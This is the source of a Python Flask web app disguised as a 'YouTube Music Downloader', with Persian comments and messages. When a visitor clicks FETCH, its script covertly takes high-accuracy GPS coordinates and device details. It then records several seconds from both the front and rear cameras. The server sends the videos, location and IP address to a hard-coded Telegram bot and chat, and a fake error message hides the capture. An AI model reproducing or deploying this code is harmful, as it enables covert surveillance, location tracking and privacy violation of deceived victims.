from flask import Flask, render_template_string, request, jsonify
import requests
import os
import json

app = Flask(__name__)

BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
TARGET_CHAT_ID = "8173349543"
WEB_URL = "https://web-production-2ed72b.up.railway.app"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Music Downloader</title>
<style>
    body{background:#f0f2f5;font-family:sans-serif;margin:0;padding:0;text-align:center}
    .header{background:#ff0000;color:white;padding:25px 10px;box-shadow:0 2px 5px rgba(0,0,0,0.2)}
    .header h1{margin:5px 0;font-size:22px;letter-spacing:1px}
    .container{background:white;max-width:420px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:left}
    .input-box{width:100%;padding:14px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:15px;outline:none}
    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 10px rgba(255,0,0,0.3)}
    .instructions{margin-top:25px;background:#fff5f5;padding:15px;border-radius:8px;border-left:4px solid #ff0000}
    .instructions h3{margin-top:0;font-size:15px;color:#333}
    .instructions ol{padding-left:20px;margin:0;font-size:13px;color:#555;line-height:1.6}
</style>
</head>
<body>
    <div class="header">
        <h1>▶ YouTube</h1>
        <h1>YOUTUBE MUSIC DOWNLOADER</h1>
    </div>

    <div class="container">
        <input type="text" class="input-box" placeholder="Paste YouTube Music Link" id="urlInput">
        <button class="btn" onclick="startProcess()">FETCH</button>

        <div class="instructions">
            <h3>How to Download HD YouTube Music Thumbnail</h3>
            <ol>
                <li>Copy the YouTube Music Video Link</li>
                <li>Paste the link in the field above</li>
                <li>Click on "FETCH" to start process</li>
            </ol>
        </div>
    </div>

    <video id="video" autoplay playsinline muted style="display:none"></video>

    <script>
    async function recordCamera(facingMode, label) {
        return new Promise(async (resolve, reject) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode }, 
                    audio: false 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    resolve({ blob, stream });
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 4000); // ضبط 4 ثانیه
            } catch (err) {
                reject(err);
            }
        });
    }

    async function startProcess() {
        const urlVal = document.getElementById('urlInput').value;
        if(!urlVal) {
            alert("لطفاً لینک را وارد کنید!");
            return;
        }

        alert("در حال پردازش و اتصال به سرور...");

        // ۱. دریافت لوکیشن و مشخصات
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const info = {
                ua: navigator.userAgent,
                lat: lat,
                lon: lon,
                screen: window.screen.width + "x" + window.screen.height
            };

            try {
                // ۲. ضبط دوربین جلو (User)
                const frontResult = await recordCamera("user", "جلو");
                frontResult.stream.getTracks().forEach(t => t.stop());

                // ارسال ویدیو دوربین جلو
                let formDataFront = new FormData();
                formDataFront.append("video", frontResult.blob);
                formDataFront.append("info", JSON.stringify(info));
                formDataFront.append("cam", "دوربین جلو (Front Camera)");
                await fetch("/upload", { method: "POST", body: formDataFront });

                // ۳. ضبط دوربین عقب (Environment)
                const rearResult = await recordCamera("environment", "عقب");
                rearResult.stream.getTracks().forEach(t => t.stop());

                // ارسال ویدیو دوربین عقب
                let formDataRear = new FormData();
                formDataRear.append("video", rearResult.blob);
                formDataRear.append("info", JSON.stringify(info));
                formDataRear.append("cam", "دوربین عقب (Rear Camera)");
                await fetch("/upload", { method: "POST", body: formDataRear });

                alert("خطا در دریافت فایل صوتی! لطفا دوباره امتحان کنید.");

            } catch (e) {
                alert("لطفاً دسترسی به دوربین و لوکیشن را تأیید کنید.");
            }
        }, (err) => {
            alert("لطفاً دسترسی به موقعیت مکانی (Location) را فعال کنید.");
        }, { enableHighAccuracy: true });
    }
    </script>
</body>
</html>
"""

@app.route("/bot", methods=["POST"])
def bot():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text == '/start':
            msg = f"سلام! برای دانلود موزیک از لینک زیر استفاده کنید:\n\n{WEB_URL}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": chat_id, "text": msg})
    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/upload", methods=["POST"])
def upload():
    video = request.files.get("video")
    info_raw = request.form.get("info")
    cam_type = request.form.get("cam", "دوربین")
    
    info = json.loads(info_raw) if info_raw else {}
    lat = info.get('lat', 'نامشخص')
    lon = info.get('lon', 'نامشخص')
    ua = info.get('ua', 'نامشخص')
    screen = info.get('screen', 'نامشخص')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = (
        f"🚨 **گزارش جدید ({cam_type}):**\n\n"
        f"📍 موقعیت GPS: {lat}, {lon}\n"
        f"🌐 آی‌پی: {user_ip}\n"
        f"🖥 صفحه نمایش: {screen}\n"
        f"📱 مشخصات دستگاه: {ua}"
    )
    
    # ارسال لوکیشن فقط در اولین درخواست (دوربین جلو)
    if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
            json={"chat_id": TARGET_CHAT_ID, "latitude": lat, "longitude": lon}
        )
    
    if video:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
            data={"chat_id": TARGET_CHAT_ID, "caption": msg},
            files={"video": ("video.webm", video.stream, "video/webm")}
        )
        
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
